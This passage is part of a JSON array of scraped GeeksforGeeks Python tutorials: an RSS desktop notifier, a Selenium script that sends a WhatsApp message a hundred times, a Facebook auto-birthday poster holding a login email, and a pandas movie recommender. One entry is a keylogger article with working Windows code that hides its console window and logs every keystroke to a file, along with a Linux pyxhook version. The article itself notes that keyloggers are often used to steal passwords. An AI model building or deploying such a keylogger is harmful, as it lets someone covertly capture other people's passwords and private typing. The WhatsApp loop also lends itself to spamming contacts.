notify2.Notification(newsitem['title'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0newsitem['summary'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0icon=ICON_PATH\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0)\u00a0\u00a0\u00a0\u00a0n.set_urgency(notify2.URGENCY_NORMAL)\u00a0\u00a0\u00a0\u00a0n.show()\u00a0\u00a0\u00a0\u00a0n.set_timeout(15000)\u00a0\u00a0\u00a0\u00a0time.sleep(1200)\u00a0\u00a0\u00a0\u00a0\u00a0if __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0parseFeed()Screenshot of the news notification popupStep by step Explanation of Code:\u00a0f = feedparser.parse(\"http://feeds.bbci.co.uk/news/rss.xml\")Here feedparser will parse the news data from the feed URL. The parsed data will be in the form of dictionary.\u00a0ICON_PATH = os.getcwd() + \"/icon.ico\"If you want to set any icon in the notification then here we are setting the Icon path. This is optional.notify2.init('News Notify')Here we are initializing the notify2 using the init method of notify2. Initialize the D-Bus connection. Must be called before you send any notifications, or retrieve server info or capabilities. for newsitem in f['items']: \n        n = notify2.Notification(newsitem['title'], \n                                 newsitem['summary'], \n                                 icon=ICON_PATH \n                                 )Looping from the parsed data to get the relevant information like news title, short summary and setting the notification icon using the Notification method of the notify2 lib.n.set_urgency(notify2.URGENCY_NORMAL)Set the urgency level to one of URGENCY_LOW, URGENCY_NORMAL or URGENCY_CRITICALn.show()This method will show the notification on the Desktopn.set_timeout(15000)Setting the time to keep the notification on the desktop (in milliseconds). I have set here as 15 seconds.\u00a0time.sleep(1200)This will usually display the news notification every 20 mins. You can set the time as per your requirement. You can find the full source code that is hosted on GitHubThis article is contributed by Srce Cde. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "7d723b17e5e288f2f1fae3498ccbfb22",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Have you ever wished to automatically wish your friends on their birthdays, or send a set of messages to your friend ( or any Whatsapp contact! ) automatically at a pre-set time, or send your friends by sending thousands of random texts on WhatsApp! Using Browser Automation you can do all of it and much more!\u00a0First, you must install these:1) Python Bindings for Selenium ( Browser Automation software )\u00a0pip install selenium2) Chrome web driver\u00a0Download Chrome driver from here: Chromedriver download page( choose your specific version )\u00a0Extract it in a known location, as we need the location laterIf you get stuck somewhere, Refer To the documentation: Documentation link3) Chromium Web Browser( Open-source version of chrome browser )\u00a0sudo apt-get install chromium-browserThat\u2019s it! You are all set.Let\u2019s dive in right awayPythonfrom selenium import webdriverfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECfrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.common.by import Byimport time\u00a0# Replace below path with the absolute path# to chromedriver in your computerdriver = webdriver.Chrome('/home/saket/Downloads/chromedriver')\u00a0driver.get(\"https://web.whatsapp.com/\")wait = WebDriverWait(driver, 600)\u00a0# Replace 'Friend's Name' with the name of your friend# or the name of a grouptarget = '\"Friend\\'s Name\"'\u00a0# Replace the below string with your own messagestring = \"Message sent using Python!!!\"\u00a0x_arg = '//span[contains(@title,' + target + ')]'group_title = wait.until(EC.presence_of_element_located((\u00a0\u00a0\u00a0\u00a0By.XPATH, x_arg)))group_title.click()inp_xpath = '//div[@class=\"_13NKt copyable-text selectable-text\"][@data-tab=\"9\"]'input_box = wait.until(EC.presence_of_element_located((\u00a0\u00a0\u00a0\u00a0By.XPATH, inp_xpath)))for i in range(100):\u00a0\u00a0\u00a0\u00a0input_box.send_keys(string + Keys.ENTER)\u00a0\u00a0\u00a0\u00a0time.sleep(1)Keep your mobile phone with you. Choose WhatsApp web from the top bar in WhatsApp(3 dots)\u00a0Then Run the script ( make sure that you have added the absolute path for the chrome driver and have replaced the target variable with your friend\u2019s name ). Scan the QR code that appears on the screen and enjoy the power of python!Please use this script only for educational purposes, i am not responsible if your friends ( or even Whatsapp ) block you.Feel free to modify the code. Try to :\u00a0Text Multiple Groups at onceSend the messages from a predefined list of messages randomly orSend a completely random text.Comment below about your experience!When it comes to browser automation, this is just the tip of the iceberg. Will write more articles on browser automation to give you a glimpse of its power!Related Post :\u00a0Browser Automation Using SeleniumThis article is contributed by Saket Modi. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "c5e02debe430bfb49d8d9f1450d4fde5",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "As we know Selenium is a tool used for controlling web browsers through a program. It can be used in all browsers, OS, and its program are written in various programming languages i.e Java, Python (all versions).\u00a0Selenium helps us automate any kind of task that we frequently do on our laptops, PCs ranging from using Facebook messenger for texting and WhatsApp also, daily tweeting tweets on Twitter, wishing friends \u201cHappy birthday\u201d on Facebook, googling anything we want to learn, and many more task. All these tasks can be automated using selenium in just a small implementation.Installation:\u00a0Go to command prompt and put this is in:pip install seleniumOnce that\u2019s done, download a web driver for automation. Here, we\u2019ll use chromedriver from http://chromedriver.chromium.org/Let\u2019s learn how to automate the process of wishing a birthday wish on a Facebook friend\u2019s timeline as a post.The whole process of this automation can be divided as follows :\u00a0Log into the Facebook application using credentials like Username and Password.Posting a \u201cHappy Birthday\u201d feed on the timeline of those friends whose birthday is today.Below are the steps:\u00a0Create a browser object and use the get() function to send a request to the website we want to connect/use.Find the elements like username and password input boxes, login button, and using the selenium functions like click(), send_keys(), etc to click on buttons and enter username and password respectively.After that using get() function to send a request to /events/birthdays/ page.At the top of this page, there is a card of \u201cToday\u2019s Birthdays\u201d which shows a friend\u2019s name whose birthday is today along with an input text box to enter any feed on their timeline.Using the XPATH of these input text boxes we will send our feed i.e., \u201cHappy Birthday\u201d using the send_keys() function of selenium.Close the browser.NOTE: Make a separate test.txt file and put your Facebook password in it before the execution of the below program.Below is the implementation:\u00a0\u00a0Python3# importing necessary classes# from different modulesfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECfrom selenium.webdriver.chrome.options import Optionsfrom selenium.common.exceptions import TimeoutExceptionfrom selenium.webdriver.common.keys import Keysimport time\u00a0chrome_options = webdriver.ChromeOptions()\u00a0prefs = {\"profile.default_content_setting_values.notifications\": 2}chrome_options.add_experimental_option(\"prefs\", prefs)browser = webdriver.Chrome(\"chromedriver.exe\")\u00a0# open facebook.com using get() methodbrowser.get('https://www.facebook.com/')\u00a0# user_name or e-mail idusername = \"agrawal.abhi108@gmail.com\"\u00a0# getting password from text filewith open('test.txt', 'r') as myfile:\u00a0\u00a0\u00a0\u00a0password = myfile.read().replace('\\n', '')\u00a0print(\"Let's Begin\")\u00a0element = browser.find_elements_by_xpath('//*[@id =\"email\"]')element[0].send_keys(username)\u00a0print(\"Username Entered\")\u00a0element = browser.find_element_by_xpath('//*[@id =\"pass\"]')element.send_keys(password)\u00a0print(\"Password Entered\")\u00a0# logging inlog_in = browser.find_elements_by_id('loginbutton')log_in[0].click()\u00a0print(\"Login Successful\")\u00a0browser.get('https://www.facebook.com/events/birthdays/')\u00a0feed = 'Happy Birthday !'\u00a0element = browser.find_elements_by_xpath(\"//*[@class ='enter_submit\\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0uiTextareaNoResize uiTextareaAutogrow uiStreamInlineTextarea\\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0inlineReplyTextArea mentionsTextarea textInput']\")\u00a0cnt = 0\u00a0for el in element:\u00a0\u00a0\u00a0\u00a0cnt += 1\u00a0\u00a0\u00a0\u00a0element_id = str(el.get_attribute('id'))\u00a0\u00a0\u00a0\u00a0XPATH = '//*[@id =\"' + element_id + '\"]'\u00a0\u00a0\u00a0\u00a0post_field = browser.find_element_by_xpath(XPATH)\u00a0\u00a0\u00a0\u00a0post_field.send_keys(feed)\u00a0\u00a0\u00a0\u00a0post_field.send_keys(Keys.RETURN)\u00a0\u00a0\u00a0\u00a0print(\"Birthday Wish posted for friend\" + str(cnt))\u00a0# Close the browserbrowser.close()My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6cda43ab51aafb732f41f160028b2d75",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Keystroke logging is the process of recording (logging) the keys pressed on a keyboard (usually when the user is unaware). It is also known as keylogging or keyboard capturing.These programs are used for troubleshooting technical problems with computers and business networks. It can also be used to monitor network usages but more often than not it is used for malicious intents like stealing passwords.This article illustrates designing a keylogger for windows and Linux.\u00a0Keylogger for WindowsDownload some python libraries\u00a01) pywin32\u00a02) pyhook\u2018Following is the code to create a keylogger in pythonPython3# Python code for keylogger# to be used in windowsimport win32apiimport win32consoleimport win32guiimport pythoncom, pyHook\u00a0\u00a0win = win32console.GetConsoleWindow()win32gui.ShowWindow(win, 0)\u00a0\u00a0def OnKeyboardEvent(event):\u00a0\u00a0\u00a0\u00a0if event.Ascii==5:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0_exit(1)\u00a0\u00a0\u00a0\u00a0if event.Ascii !=0 or 8:\u00a0\u00a0\u00a0\u00a0#open output.txt to read current keystrokes\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f = open('c:\\output.txt', 'r+')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0buffer = f.read()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f.close()\u00a0\u00a0\u00a0\u00a0# open output.txt to write current + new keystrokes\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f = open('c:\\output.txt', 'w')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0keylogs = chr(event.Ascii)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if event.Ascii == 13:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0keylogs = '/n'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0buffer += keylogs\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f.write(buffer)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f.close()# create a hook manager objecthm = pyHook.HookManager()hm.KeyDown = OnKeyboardEvent# set the hookhm.HookKeyboard()# wait foreverpythoncom.PumpMessages()Save the file in C:\\ as Keylogger.py and run the python file\u00a0Output:\u00a0The keylogger will be started in the background and save all the data on the log file \u201cc:\\output.txt\u201d.Keylogger in Linuxpyxhook requires python-Xlib. Install it if you don\u2019t have it already.\u00a0sudo apt-get install python-xlibDownload pyxhook libraryPython3# Python code for keylogger# to be used in linuximport osimport pyxhook\u00a0\u00a0# This tells the keylogger where the log file will go.# You can set the file path as an environment variable ('pylogger_file'),# or use the default ~/Desktop/file.loglog_file = os.environ.get(\u00a0\u00a0\u00a0\u00a0'pylogger_file',\u00a0\u00a0\u00a0\u00a0os.path.expanduser('~/Desktop/file.log'))# Allow setting the cancel key from environment args, Default: `cancel_key = ord(\u00a0\u00a0\u00a0\u00a0os.environ.get(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'pylogger_cancel',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'`'\u00a0\u00a0\u00a0\u00a0)[0])\u00a0\u00a0# Allow clearing the log file on start, if pylogger_clean is defined.if os.environ.get('pylogger_clean', None) is not None:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0os.remove(log_file)\u00a0\u00a0\u00a0\u00a0except EnvironmentError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# File does not exist, or no permissions.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0#creating key pressing event and saving it into log filedef OnKeyPress(event):\u00a0\u00a0\u00a0\u00a0with open(log_file, 'a') as f:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f.write('{}\\n'.format(event.Key))\u00a0\u00a0# create a hook manager objectnew_hook = pyxhook.HookManager()new_hook.KeyDown = OnKeyPress# set the hooknew_hook.HookKeyboard()try:\u00a0\u00a0\u00a0\u00a0new_hook.start()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 # start the hookexcept KeyboardInterrupt:\u00a0\u00a0\u00a0\u00a0# User cancelled from command line.\u00a0\u00a0\u00a0\u00a0passexcept Exception as ex:\u00a0\u00a0\u00a0\u00a0# Write exceptions to the log file, for analysis later.\u00a0\u00a0\u00a0\u00a0msg = 'Error while catching events:\\n\u00a0 {}'.format(ex)\u00a0\u00a0\u00a0\u00a0pyxhook.print_err(msg)\u00a0\u00a0\u00a0\u00a0with open(log_file, 'a') as f:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f.write('\\n{}'.format(msg))Output:\u00a0The keylogger will be started in the background and save all the data on the file.log file \u201c/home/Akash/Desktop\u201d.\u00a0\u00a0https://media.geeksforgeeks.org/wp-content/cdn-uploads/20201208110622/Keylogger-in-python-720-x-1280.mp4References\u00a0https://en.wikipedia.org/wiki/Keystroke_loggingThis article is contributed by Akash Sharan. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "013b536b77c871e46258f1466f99add7",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Recommender System is a system that seeks to predict or filter preferences according to the user\u2019s choices. Recommender systems are utilized in a variety of areas including movies, music, news, books, research articles, search queries, social tags, and products in general.\u00a0Recommender systems produce a list of recommendations in any of the two ways \u2013\u00a0\u00a0Collaborative filtering: Collaborative filtering approaches build a model from the user\u2019s past behavior (i.e. items purchased or searched by the user) as well as similar decisions made by other users. This model is then used to predict items (or ratings for items) that users may have an interest in.Content-based filtering: Content-based filtering approaches uses a series of discrete characteristics of an item in order to recommend additional items with similar properties. Content-based filtering methods are totally based on a description of the item and a profile of the user\u2019s preferences. It recommends items based on the user\u2019s past preferences.Let\u2019s develop a basic recommendation system using Python and Pandas.\u00a0Let\u2019s focus on providing a basic recommendation system by suggesting items that are most similar to a particular item, in this case, movies. It just tells what movies/items are most similar to the user\u2019s movie choice.To download the files, click on the links \u2013 .tsv file, Movie_Id_Titles.csv.Import dataset with delimiter \u201c\\t\u201d as the file is a tsv file (tab-separated file).\u00a0\u00a0Python3# import pandas libraryimport pandas as pd\u00a0# Get the datacolumn_names = ['user_id', 'item_id', 'rating', 'timestamp']\u00a0path = 'https://media.geeksforgeeks.org/wp-content/uploads/file.tsv'\u00a0df = pd.read_csv(path, sep='\\t', names=column_names)\u00a0# Check the head of the datadf.head()\u00a0\u00a0Python3# Check out all the movies and their respective IDsmovie_titles = pd.read_csv('https://media.geeksforgeeks.org/wp-content/uploads/Movie_Id_Titles.csv')movie_titles.head()\u00a0\u00a0\u00a0Python3data = pd.merge(df, movie_titles, on='item_id')data.head()\u00a0\u00a0Python3# Calculate mean rating of all moviesdata.groupby('title')['rating'].mean().sort_values(ascending=False).head()\u00a0\u00a0\u00a0Python3# Calculate count rating of all moviesdata.groupby('title')['rating'].count().sort_values(ascending=False).head()\u00a0\u00a0\u00a0Python3# creating dataframe with 'rating' count valuesratings = pd.DataFrame(data.groupby('title')['rating'].mean())\u00a0ratings['num of ratings'] = pd.DataFrame(data.groupby('title')['rating'].count())\u00a0ratings.head()\u00a0\u00a0\u00a0Visualization imports:\u00a0\u00a0Python3import matplotlib.pyplot as pltimport seaborn as sns\u00a0sns.set_style('white')%matplotlib inline\u00a0\u00a0Python3# plot graph of 'num of ratings column'plt.figure(figsize =(10, 4))\u00a0ratings['num of ratings'].hist(bins = 70)\u00a0\u00a0Python3# plot graph of 'ratings' columnplt.figure(figsize =(10, 4))\u00a0ratings['rating'].hist(bins = 70)\u00a0\u00a0Python3# Sorting values according to# the 'num of rating column'moviemat = data.pivot_table(index ='user_id',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0columns ='title', values ='rating')\u00a0moviemat.head()\u00a0ratings.sort_values('num of ratings', ascending = False).head(10)\u00a0\u00a0\u00a0Python3# analysing correlation with similar moviesstarwars_user_ratings = moviemat['Star Wars (1977)']liarliar_user_ratings = moviemat['Liar Liar (1997)']\u00a0starwars_user_ratings.head()\u00a0\u00a0Python3# analysing correlation with similar moviessimilar_to_starwars = moviemat.corrwith(starwars_user_ratings)similar_to_liarliar = moviemat.corrwith(liarliar_user_ratings)\u00a0corr_starwars = pd.DataFrame(similar_to_starwars, columns =['Correlation'])corr_starwars.dropna(inplace = True)\u00a0corr_starwars.head()\u00a0\u00a0\u00a0\u00a0Python3# Similar movies like starwarscorr_starwars.sort_values('Correlation', ascending = False).head(10)corr_starwars = corr_starwars.join(ratings['num of ratings'])\u00a0corr_starwars.head()\u00a0corr_starwars[corr_starwars['num of ratings']>100].sort_values('Correlation', ascending = False).head()Python3# Similar movies as of liarliarcorr_liarliar = pd.DataFrame(similar_to_liarliar, columns =['Correlation'])corr_liarliar.dropna(inplace = True)\u00a0corr_liarliar = corr_liarliar.join(ratings['num of ratings'])corr_liarliar[corr_liarliar['num of ratings']>100].sort_values('Correlation', ascending = False).head()My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  }
]
